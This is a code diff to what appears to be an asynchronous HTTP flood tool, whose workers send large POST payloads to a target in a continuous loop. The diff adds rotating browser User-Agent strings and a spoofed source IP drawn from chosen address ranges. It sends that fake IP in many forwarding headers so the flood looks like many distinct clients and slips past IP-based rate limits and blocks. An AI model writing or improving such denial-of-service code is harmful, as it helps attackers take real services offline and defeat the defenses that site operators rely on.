@@ -7,6 +7,19 @@ _total_requests = 0
 _tasks = []
 _monitor_task = None
 
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+]
+
 
 async def _worker(worker_id, target, kb_size, on_update):
     global _is_running, _total_requests
@@ -28,12 +41,23 @@ async def _worker(worker_id, target, kb_size, on_update):
     try:
         while _is_running:
             try:
-                fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+                fake_ip = f"{random.choice([5, 31, 37, 77, 80, 81, 82, 85, 87, 88, 89, 91, 93, 94, 95, 109, 147, 158, 176, 178, 185, 188, 193, 194, 212, 213, 217])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                 headers = {
-                    "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+                    "User-Agent": random.choice(USER_AGENTS),
+                    "X-Real-IP": fake_ip,
                     "X-Forwarded-For": fake_ip,
+                    "X-Forwarded-Host": fake_ip,
+                    "X-Client-IP": fake_ip,
+                    "X-Remote-IP": fake_ip,
+                    "X-Remote-Addr": fake_ip,
+                    "Originating-IP": fake_ip,
                     "Content-Type": "application/x-www-form-urlencoded",
-                    "Connection": "keep-alive"
+                    "Accept": "*/*",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Connection": "keep-alive",
+                    "Cache-Control": "no-cache",
+                    "Pragma": "no-cache",
                 }
                 async with session.post(target, data=data, headers=headers, timeout=10) as resp:
                     status = resp.status
